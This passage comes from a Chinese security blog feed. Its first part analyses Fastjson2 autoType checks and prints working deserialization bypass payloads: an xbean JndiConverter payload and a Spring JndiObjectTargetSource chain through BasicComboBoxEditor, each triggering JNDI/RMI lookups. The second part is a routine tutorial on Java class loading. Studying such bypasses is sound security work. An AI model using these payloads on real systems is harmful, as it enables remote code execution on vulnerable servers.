class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                    clazz = TypeUtils.loadClass(typeName);</span><br><span class="line">                                    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                                        &#125;</span><br><span class="line"></span><br><span class="line">                                        <span class="built_in">this</span>.afterAutoType(typeName, clazz);</span><br><span class="line">                                        <span class="keyword">return</span> clazz;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure>

<p>如果不支持的话,就先会和黑名单比较,跟之前差不多</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">                            hash = -<span class="number">3750763034362895579L</span>;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; typeNameLength; ++i) &#123;</span><br><span class="line">                                ch = typeName.charAt(i);</span><br><span class="line">                                <span class="keyword">if</span> (ch == <span class="string">&#x27;$&#x27;</span>) &#123;</span><br><span class="line">                                    ch = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                hash ^= (<span class="type">long</span>)ch;</span><br><span class="line">                                hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                                <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                    clazz = TypeUtils.loadClass(typeName);</span><br><span class="line">                                    <span class="keyword">if</span> (clazz != <span class="literal">null</span> &amp;&amp; expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="built_in">this</span>.afterAutoType(typeName, clazz);</span><br><span class="line">                                    <span class="keyword">return</span> clazz;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure>

<p>如果白名单黑名单都没有的话,且没有开启支持自定义反序列化就归还null了,这里跟之前相比,之前会先走下面的,从map里面先找加载的类,没找到再走,这如果map里面有类的话还是会有afterAutoType方法,只有没有这个class,才会直接加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            clazz = TypeUtils.getMapping(typeName);</span><br><span class="line">                            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass != Object.class &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="built_in">this</span>.afterAutoType(typeName, clazz);</span><br><span class="line">                                    <span class="keyword">return</span> clazz;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                clazz = TypeUtils.loadClass(typeName);</span><br><span class="line">                                <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || JDKUtils.isSQLDataSourceOrRowSet(clazz)) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                                            <span class="built_in">this</span>.afterAutoType(typeName, clazz);</span><br><span class="line">                                            <span class="keyword">return</span> clazz;</span><br><span class="line">                                        &#125;</span><br><span class="line"></span><br><span class="line">                                        <span class="keyword">if</span> ((features &amp; Feature.IgnoreAutoTypeNotMatch.mask) != <span class="number">0L</span>) &#123;</span><br><span class="line">                                            <span class="keyword">return</span> expectClass;</span><br><span class="line">                                        &#125;</span><br><span class="line"></span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="built_in">this</span>.afterAutoType(typeName, clazz);</span><br><span class="line">                                <span class="keyword">return</span> clazz;</span><br><span class="line">                            &#125;</span><br></pre></td></tr></table></figure>

<p>这次发现里面会有</p>
<p>判断是否为 SQLDataSourceOrRowSet 类型的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || JDKUtils.isSQLDataSourceOrRowSet(clazz)) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>进afterAutoType方法看看,发现afterAutoType是给map里面加我们class类的,看向loadclass,发现还是允许我们去绕过哪些类</p>
<p><img src="https://baicany.github.io/images/image-20231129195350933.png" alt="image-20231129195350933"></p>
<p>回到一开始,毕竟我们这里是从不开分析了,如果开了,最后ObjectReaederImpIMap会调用到,这里也会触发getObjectReaderAutoType方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeObjectReader == <span class="literal">null</span>) &#123;</span><br><span class="line">    typeName = jsonReader.getString();</span><br><span class="line">    autoTypeObjectReader = context.getObjectReaderAutoType(typeName, (Class)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用之前的poc并不行了</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="string">&quot;DataSourceName&quot;</span>:<span class="string">&quot;rmi&quot;</span>,</span><br><span class="line"><span class="string">&quot;AutoCommit&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>因为里面有SQLDataSourceOrRowSet类型的类</p>
<p><img src="https://baicany.github.io/images/image-20231129202752417.png" alt="image-20231129202752417"></p>
<p>要找到可以利⽤的POC也简单，只需要找⼀个不是 Datasource 相关的类即可。如下：</p>
<p>依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-reflect<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>4.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">&lt;/dependency</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">	<span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lorg.apache.xbean.propertyeditor.JndiConverter;\&quot;,\&quot;asText\&quot;:\&quot;rmi://127.0</span></span><br><span class="line"><span class="string">.0.1:8089/test\&quot;&#125;&quot;</span>;</span><br><span class="line">	<span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(poc, JSONReader.Feature.UseNativeObject,</span><br><span class="line">	JSONReader.Feature.SupportAutoType);</span><br><span class="line">	System.out.println(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Spring框架中的依赖利用"><a href="#Spring框架中的依赖利用" class="headerlink" title="Spring框架中的依赖利用"></a>Spring框架中的依赖利用</h4><p>为了继续深⼊找到⼀个被更加⼴泛引⼊的利⽤类，有个大哥对spring进⾏了进⼀步查找，发现在Spring中存在这么⼀个 类： org.springframework.jndi.JndiObjectTargetSource ，这个类有⼀个 getTarget 方法，可以触发 JNDI的调⽤。下面是⼀个最小调用的demo。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc3</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot; </span></span><br><span class="line"><span class="string">\&quot;@type\&quot;:\&quot;Lorg.springframework.jndi.JndiObjectTargetSource;\&quot;,\n&quot;</span> +</span><br><span class="line"><span class="string">&quot; \&quot;jndiName\&quot;: \&quot;rmi://127.0.0.1:12312/Exp\&quot;,\n&quot;</span> +</span><br><span class="line"><span class="string">&quot; \&quot;jndiTemplate\&quot;: &#123;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot; \&quot;@type\&quot;:\&quot;org.springframework.jndi.JndiTemplate\&quot;,\n&quot;</span> +</span><br><span class="line"><span class="string">&quot; \&quot;environment\&quot;: &#123;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot; \&quot;java.naming.factory.initial\&quot;:</span></span><br><span class="line"><span class="string">\&quot;com.sun.jndi.rmi.registry.RegistryContextFactory\&quot;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot; &#125;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot; &#125;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">JndiObjectTargetSource</span> <span class="variable">o</span> <span class="operator">=</span> (JndiObjectTargetSource) JSON.parse(poc3,</span><br><span class="line">JSONReader.Feature.SupportAutoType);</span><br><span class="line">o.getTarget();</span><br></pre></td></tr></table></figure>

<p>为了让这个利⽤更加好⽤，还需要想⼀个办法让他能⾃动调⽤到 JndiObjectTargetSource 对象的 getTarget ⽅法。</p>
<p>⼀条调⽤路径为： setXXX -&gt; toString -&gt; getTarget </p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> 	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;javax.swing.plaf.basic.BasicComboBoxEditor&quot;</span>,</span><br><span class="line"> 	<span class="string">&quot;item&quot;</span>:&#123;</span><br><span class="line"> 	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson2.JSONObject&quot;</span>,</span><br><span class="line"> 	<span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line"> 		<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lorg.springframework.jndi.JndiObjectTargetSource;&quot;</span>,</span><br><span class="line"> 		<span class="string">&quot;jndiName&quot;</span>: <span class="string">&quot;rmi://127.0.0.1:12312/Exp&quot;</span>,</span><br><span class="line"> 		<span class="string">&quot;jndiTemplate&quot;</span>: &#123;</span><br><span class="line"> 			<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.springframework.jndi.JndiTemplate&quot;</span>,</span><br><span class="line"> 			<span class="string">&quot;environment&quot;</span>: &#123;</span><br><span class="line"> 				<span class="string">&quot;java.naming.factory.initial&quot;</span>:</span><br><span class="line">				<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span></span><br><span class="line"> 				&#125;</span><br><span class="line"> 			&#125;</span><br><span class="line"> 		&#125;</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Fastjson2 在构造 BasicComboBoxEditor 对象时，会调⽤它的 setItem ⽅法，而 setItem ⽅法会调用到<br>JSONObject 的 toString ⽅法，然后会进⼀步调⽤到 JndiObjectTargetSource 的 getTarget ⽅法。<br>完整利⽤demo如下。</p>
<figure class="highlight wren"><table><tr><td class="code"><pre><span class="line"><span class="title class_">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line"><span class="string">&quot; <span class="char escape_">\&quot;</span>@type<span class="char escape_">\&quot;</span>:<span class="char escape_">\&quot;</span>javax.swing.plaf.basic.BasicComboBoxEditor<span class="char escape_">\&quot;</span>,<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line"><span class="string">&quot; <span class="char escape_">\&quot;</span>item<span class="char escape_">\&quot;</span>:&#123;<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line"><span class="string">&quot; <span class="char escape_">\&quot;</span>@type<span class="char escape_">\&quot;</span>:<span class="char escape_">\&quot;</span>com.alibaba.fastjson2.JSONObject<span class="char escape_">\&quot;</span>,<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line"><span class="string">&quot; <span class="char escape_">\&quot;</span>a<span class="char escape_">\&quot;</span>: &#123;<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line"><span class="string">&quot; </span></span><br><span class="line"><span class="string"><span class="char escape_">\&quot;</span>@type<span class="char escape_">\&quot;</span>:<span class="char escape_">\&quot;</span>Lorg.springframework.jndi.JndiObjectTargetSource;<span class="char escape_">\&quot;</span>,<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line"><span class="string">&quot; <span class="char escape_">\&quot;</span>jndiName<span class="char escape_">\&quot;</span>: <span class="char escape_">\&quot;</span>rmi://127.0.0.1:12312/Exp<span class="char escape_">\&quot;</span>,<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line"><span class="string">&quot; <span class="char escape_">\&quot;</span>jndiTemplate<span class="char escape_">\&quot;</span>: &#123;<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line"><span class="string">&quot; </span></span><br><span class="line"><span class="string"><span class="char escape_">\&quot;</span>@type<span class="char escape_">\&quot;</span>:<span class="char escape_">\&quot;</span>org.springframework.jndi.JndiTemplate<span class="char escape_">\&quot;</span>,<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line"><span class="string">&quot; <span class="char escape_">\&quot;</span>environment<span class="char escape_">\&quot;</span>: &#123;<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line"><span class="string">&quot; <span class="char escape_">\&quot;</span>java.naming.factory.initial<span class="char escape_">\&quot;</span>:</span></span><br><span class="line"><span class="string"><span class="char escape_">\&quot;</span>com.sun.jndi.rmi.registry.RegistryContextFactory<span class="char escape_">\&quot;</span><span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line">					<span class="string">&quot; &#125;<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line">				<span class="string">&quot; &#125;<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line">			<span class="string">&quot; &#125;<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line">		<span class="string">&quot; &#125;<span class="char escape_">\n</span>&quot;</span> <span class="operator">+</span></span><br><span class="line">	<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="title class_">Object</span> <span class="variable">o</span> <span class="operator">=</span> (<span class="title class_">Object</span>) <span class="variable">JSON</span>.<span class="property">parse</span>(<span class="variable">poc</span>, <span class="title class_">JSONReader</span>.<span class="property">Feature</span>.<span class="property">SupportAutoType</span>);</span><br></pre></td></tr></table></figure>

<p>其实这种bypass也不是Fastjson2全版本通杀的，原因在于只有 2.0.14 版本开始，loadClass 才会对 L 和 ; 进 ⾏处理。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.javasec.org/java-vuls/FastJson.html">https://www.javasec.org/java-vuls/FastJson.html</a> </p>
<p><a href="https://su18.org/post/fastjson-1.2.68/#charsequenceinputstream">Fastjson 68 commons-io AutoCloseable | 素十八 (su18.org)</a></p>
<p><a href="https://www.ctfiot.com/132404.html">https://www.ctfiot.com/132404.html</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java类加载机制</title>
    <url>/2023/07/08/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>我连基础都不会,被师傅骂了o(╥﹏╥)o学崔子的java</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">机器码(machine code)，学名机器语言指令，有时也被称为原生码（Native Code），是电脑的CPU可直接解读的数据。</span><br><span class="line">字节码（Bytecode）是一种包含执行程序、由一序列 op 代码/数据对 组成的二进制文件。字节码是一种中间码，它比机器码更抽象，需要直译器转译后才能成为机器码的中间代码。是一种中间表示形式，用于在计算机上执行的程序。它是一种低级的、与特定平台无关的指令集，可以由解释器或虚拟机在运行时解释或执行。</span><br><span class="line">java字节码是一种特定于Java编程语言的字节码形式。当Java源代码被编译成字节码时，它变成了一系列以字节为单位的指令，这些指令是为Java虚拟机（JVM）设计的。</span><br><span class="line">类装载器（<span class="keyword">Class</span> Loader）是Java虚拟机（JVM）的组成部分，负责动态加载类文件到内存中，并生成对应的类对象。它是Java平台实现动态类加载和运行时模块化的重要机制。</span><br><span class="line">	类文件加载：类装载器负责从文件系统、网络或其他来源加载类文件（通常是以 .<span class="keyword">class</span> 文件的形式）。它根据类的全限定名（Fully Qualified <span class="keyword">Name</span>）查找并读取类文件的字节码数据。</span><br><span class="line">类文件解析：类装载器将类文件的字节码数据解析为虚拟机可以理解的内部结构，并创建对应的类对象。这个过程包括解析类的继承关系、字段、方法、注解等信息。</span><br></pre></td></tr></table></figure>

<h1 id="类加载机制概念"><a href="#类加载机制概念" class="headerlink" title="类加载机制概念"></a>类加载机制概念</h1><ul>
<li>Java虚拟机把描述类的数据从Class文件加载到内存，并对数据进行校验、转换解析和初始化，最终形成可以被虚拟机直接使用的Java类型，这就是虚拟机的加载机制。<strong>Class文件由类装载器装载后，在JVM中将形成一份描述Class结构的元信息对象，通过该元信息对象可以获知Class的结构信息：如构造函数，属性和方法等 ，Java允许用户借由这个Class相关的元信息对象间接调用Class对象的功能,这里就是我们经常能见到的Class类。</strong></li>
</ul>
<h1 id="类加载过程"><a href="#类加载过程" class="headerlink" title="类加载过程"></a>类加载过程</h1><p><img src="https://baicany.github.io/images/1618817ff24.image" alt="img"></p>
<p>工作机制</p>
<p>类装载器就是寻找类的字节码文件，并构造出类在JVM内部表示的对象组件。在Java中，类装载器把一个类装入JVM中，要经过以下步骤：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"> (<span class="number">1</span>) 装载：查找和导入Class文件；</span><br><span class="line"></span><br><span class="line"> (<span class="number">2</span>) 链接：把类的二进制数据合并到JRE中；</span><br><span class="line">     (a)校验：检查载入Class文件数据的正确性；</span><br><span class="line">     (b)准备：给类的静态变量分配存储空间；</span><br><span class="line">     (c)解析：将符号引用转成直接引用；</span><br><span class="line"> (<span class="number">3</span>) 初始化：对类的静态变量，静态代码块执行初始化操作</span><br><span class="line"></span><br><span class="line">关于解析中的引用，具体来说，它指的是类中的符号引用（Symbolic Reference）。在Java代码中，当使用类、方法、字段等时，通常会使用类名、方法名、字段名等符号来引用它们，而不直接使用它们的内存地址。</span><br><span class="line"></span><br><span class="line">解析阶段的目的是将这些符号引用转换为直接引用（Direct Reference），即将其解析为对应的内存地址。这样，在实际执行代码时，就可以直接使用内存地址来访问相应的类、方法、字段等。</span><br><span class="line"></span><br><span class="line">解析阶段的过程可能涉及符号引用的查找、符号解析和符号引用和直接引用之间的关联等操作，以确保符号引用能够正确地解析为对应的实际对象。</span><br></pre></td></tr></table></figure>

<p>Java程序可以动态扩展是由运行期动态加载和动态链接实现的；比如：如果编写一个使用接口的应用程序，可以等到运行时再指定其实际的实现(多态)，解析过程有时候还可以在初始化之后执行；比如：动态绑定(多态) 如上图所示，加载、验证、准备、初始化和卸载这五个阶段的顺序是确定的，类的加载过程必须按照这个顺序来按部就班地开始，而解析阶段则不一定，它在某些情况下可以在初始化阶段后再开始。 类的生命周期的每一个阶段通常都是互相交叉混合式进行的，通常会在一个阶段执行的过程中调用或激活另外一个阶段。</p>
<p><strong>1. 装载(加载)</strong></p>
<p>类的装载指的是将类的.class文件中的二进制数据读入到内存中，将其放在运行时数据区的方法区内，然后在堆区创建一个java.lang.Class对象，用来封装类在方法区内的数据结构。类的加载的最终产品是位于堆区中的Class对象，Class对象封装了类在方法区内的数据结构，并且向Java程序员提供了访问方法区内的数据结构的接口。</p>
<p>类加载器并不需要等到某个类被“首次主动使用”时再加载它，JVM规范允许类加载器在预料某个类将要被使用时就预先加载它，如果在预先加载的过程中遇到了.class文件缺失或存在错误，类加载器必须在程序首次主动使用该类时才报告错误（LinkageError错误）如果这个类一直没有被程序主动使用，那么类加载器就不会报告错误。</p>
<p>加载.class文件的方式有:</p>
<p>1). 从本地系统中直接加载 2). 通过网络下载.class文件 3). 从zip，jar等归档文件中加载.class文件 4). 从专有数据库中提取.class文件 5). 将Java源文件动态编译为.class文件</p>
<p>在了解了什么是类的加载后，回头来再看jvm进行类加载阶段都做了什么。虚拟机需要完成以下三件事情：</p>
<p>1).通过一个类的全限定名称来获取定义此类的二进制字节流。</p>
<p>2).将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构。</p>
<p>3).在java堆中生成一个代表这个类的java.lang.Class对象，作为方法区这些数据的访问入口。</p>
<p>相对于类加载过程的其他阶段，加载阶段是开发期相对来说可控性比较强，该阶段既可以使用系统提供的类加载器完成，也可以由用户自定义的类加载器来完成，开发人员可以通过定义自己的类加载器去控制字节流的获取方式。关于这个过程的更多细节，我会在下一节细说，类的加载。 加载阶段完成后，虚拟机外部的 二进制字节流就按照虚拟机所需的格式存储在方法区之中，而且在Java堆中也创建一个java.lang.Class类的对象，这样便可以通过该对象访问方法区中的这些数据。</p>
<p><strong>2. 验证</strong></p>
<p>验证的目的是为了确保Class文件中的字节流包含的信息符合当前虚拟机的要求，而且不会危害虚拟机自身的安全。不同的虚拟机对类验证的实现可能会有所不同，但大致都会完成以下四个阶段的验证：文件格式的验证、元数据的验证、字节码验证和符号引用验证。</p>
<p>1）文件格式的验证：验证字节流是否符合Class文件格式的规范，并且能被当前版本的虚拟机处理，该验证的主要目的是保证输入的字节流能正确地解析并存储于方法区之内。经过该阶段的验证后，字节流才会进入内存的方法区中进行存储，后面的三个验证都是基于方法区的存储结构进行的。</p>
<p>2）元数据验证：对类的元数据信息进行语义校验（其实就是对类中的各数据类型进行语法校验），保证不存在不符合Java语法规范的元数据信息。</p>
<p>3）字节码验证：该阶段验证的主要工作是进行数据流和控制流分析，对类的方法体进行校验分析，以保证被校验的类的方法在运行时不会做出危害虚拟机安全的行为。</p>
<p>4）符号引用验证：这是最后一个阶段的验证，它发生在虚拟机将符号引用转化为直接引用的时候（解析阶段中发生该转化，后面会有讲解），主要是对类自身以外的信息（常量池中的各种符号引用）进行匹配性的校验。</p>
<p><strong>3. 准备</strong></p>
<p>准备阶段是正式为类变量分配内存并设置类变量初始值的阶段，这些内存都将在方法区中进行分配。 注：</p>
<p>1）这时候进行内存分配的仅包括类变量（static），而不包括实例变量，实例变量会在对象实例化时随着对象一块分配在Java堆中。</p>
<p>2）这里所设置的初始值通常情况下是数据类型默认的零值（如0、0L、null、false等），而不是被在Java代码中被显式地赋予的值。</p>
<p><strong>4. 解析</strong></p>
<p>解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程。</p>
<p>符号引用（Symbolic Reference）：符号引用以一组符号来描述所引用的目标，符号引用可以是任何形式的字面量，符号引用与虚拟机实现的内存布局无关，引用的目标并不一定已经在内存中。</p>
<p>直接引用（Direct Reference）：直接引用可以是直接指向目标的指针、相对偏移量或是一个能间接定位到目标的句柄。直接引用是与虚拟机实现的内存布局相关的，同一个符号引用在不同的虚拟机实例上翻译出来的直接引用一般都不相同，如果有了直接引用，那引用的目标必定已经在内存中存在。</p>
<p>1)、类或接口的解析：判断所要转化成的直接引用是对数组类型，还是普通的对象类型的引用，从而进行不同的解析。 2)、字段解析：对字段进行解析时，会先在本类中查找是否包含有简单名称和字段描述符都与目标相匹配的字段，如果有，则查找结束；如果没有，则会按照继承关系从上往下递归搜索该类所实现的各个接口和它们的父接口，还没有，则按照继承关系从上往下递归搜索其父类，直至查找结束。</p>
<p>3)、类方法解析：对类方法的解析与对字段解析的搜索步骤差不多，只是多了判断该方法所处的是类还是接口的步骤，而且对类方法的匹配搜索，是先搜索父类，再搜索接口。</p>
<p>4)、接口方法解析：与类方法解析步骤类似，只是接口不会有父类，因此，只递归向上搜索父接口就行了。</p>
<p><strong>5. 初始化</strong></p>
<p>类初始化阶段是类加载过程的最后一步，前面的类加载过程中，除了加载（Loading）阶段用户应用程序可以通过自定义类加载器参与之外，其余动作完全由虚拟机主导和控制。到了初始化阶段，才真正开始执行类中定义的Java程序代码。 初始化，为类的静态变量赋予正确的初始值，JVM负责对类进行初始化，主要对类变量进行初始化。在Java中对类变量进行初始值设定有两种方式：</p>
<p>①声明类变量时指定初始值</p>
<p>②使用静态代码块为类变量指定初始值</p>
<p>JVM初始化步骤</p>
<p>1)、假如这个类还没有被加载和连接，则程序先加载并连接该类</p>
<p>2)、假如该类的直接父类还没有被初始化，则先初始化其直接父类</p>
<p>3)、假如类中有初始化语句，则系统依次执行这些初始化语句</p>
<p>初始化阶段时执行类构造器方法()的过程。</p>
<p>1）类构造器方法是由编译器自动收集类中的所有类变量的赋值动作和静态语句块（static{}块）中的语句合并产生的，编译器收集的顺序由语句在源文件中出现的顺序所决定。</p>
<p>2）类构造器方法与类的构造函数不同，它不需要显式地调用父类构造器，虚拟机会保证在子类的类构造器方法执行之前，父类的类构造器方法已经执行完毕，因此在虚拟机中第一个执行的类构造器方法的类一定是java.lang.Object。</p>
<p>3）由于父类的类构造器方法方法先执行，也就意味着父类中定义的静态语句块要优先于子类的变量赋值操作。</p>
<p>4）类构造器方法对于类或者接口来说并不是必需的，如果一个类中没有静态语句块也没有对变量的赋值操作，那么编译器可以不为这个类生成类构造器方法。</p>
<p>5）接口中可能会有变量赋值操作，因此接口也会生成类构造器方法。但是接口与类不同，执行接口的类构造器方法不需要先执行父接口的类构造器方法。只有当父接口中定义的变量被使用时，父接口才会被初始化。另外，接口的实现类在初始化时也不会执行接口的类构造器方法。</p>
<p>6）虚拟机会保证一个类的类构造器方法在多线程环境中被正确地加锁和同步。如果有多个线程去同时初始化一个类，那么只会有一个线程去执行这个类的类构造器方法，其它线程都需要阻塞等待，直到活动线程执行类构造器方法完毕。如果在一个类的类构造器方法中有耗时很长的操作，那么就可能造成多个进程阻塞。</p>
<p><strong>6.结束生命周期</strong></p>
<p>在以下情况的时候，Java虚拟机会结束生命周期 1). 执行了System.exit()方法 2). 程序正常执行结束 3). 程序在执行过程中遇到了异常或错误而异常终止 4). 由于操作系统出现错误而导致Java虚拟机进程终止</p>
<h1 id="何时开始类的初始化"><a href="#何时开始类的初始化" class="headerlink" title="何时开始类的初始化"></a>何时开始类的初始化</h1><p>什么情况下需要开始类加载过程的第一个阶段:”加载”。虚拟机规范中并没强行约束，这点可以交给虚拟机的的具体实现自由把握，但是对于初始化阶段虚拟机规范是严格规定了如下几种情况，如果类未初始化会对类进行初始化。</p>
<p>1、创建类的实例</p>
